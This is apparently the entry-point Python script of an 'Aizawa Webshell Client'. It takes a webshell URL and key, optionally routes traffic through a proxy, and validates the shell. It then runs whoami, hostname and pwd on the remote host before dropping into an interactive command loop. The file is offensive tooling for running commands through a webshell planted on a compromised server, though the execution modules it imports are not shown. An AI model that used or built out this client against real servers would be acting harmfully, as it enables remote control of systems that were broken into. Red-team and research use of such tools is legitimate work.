import re
import sys
import getpass
import asyncio
import argparse
from aizawa.core.executor import Executor
from aizawa.core.validator import Validator
from aizawa.http.client import HttpClient
from aizawa.utils.banner import display_banner
from aizawa.utils.colors import Colors
from aizawa import __version__

def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Aizawa Webshell Client",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument(
        '-u', '--url',
        help='Webshell URL',
        type=str
    )

    parser.add_argument(
        '-k', '--key',
        help='Webshell KEY',
        type=str
    )

    parser.add_argument(
        '-p', '--proxy',
        help='Proxy URL (e.g., http://127.0.0.1:8080)',
        type=str
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version=f'Version {__version__}'
    )

    return parser.parse_args()

async def async_main() -> None:
    args = parse_arguments()

    url: str = args.url if args.url else input("Webshell URL: ")
    url = Validator.validate_url(url)
    keys: str = args.key if args.key else getpass.getpass("Webshell KEY: ")

    regex = re.compile(r"^.*\.[a-zA-Z]+", re.MULTILINE)
    url = regex.findall(url)[0]

    # Create HTTP client with proxy if specified
    async with HttpClient(proxy=args.proxy) as client:
        if args.proxy:
            print(f"{Colors.YELLOW}Using proxy: {args.proxy}{Colors.CLEAR}")

        await client.ping(url)
        headers = await client.get_headers(url)
        shell_type = Validator.validate_headers(headers)
        shell_type = Validator.validate_type(shell_type)

        if not await Validator.validate_key(client, url, shell_type, keys):
            sys.exit(1)

        user = await Executor.execute(client, url, "whoami", shell_type, keys)
        host = await Executor.execute(client, url, "hostname", shell_type, keys)
        pwd = await Executor.execute(client, url, "pwd", shell_type, keys)

        user, host, pwd = Validator.process_user_host_pwd(user, host, pwd)
        await Executor.execute_commands(client, url, shell_type, user, host, pwd, keys)

def main():
    display_banner()
    try:
        asyncio.run(async_main())
    except KeyboardInterrupt:
        print(f"\n{Colors.BOLD}{Colors.RED}Ctrl + C detected. Exiting...{Colors.CLEAR}")

if __name__ == "__main__":
    main()
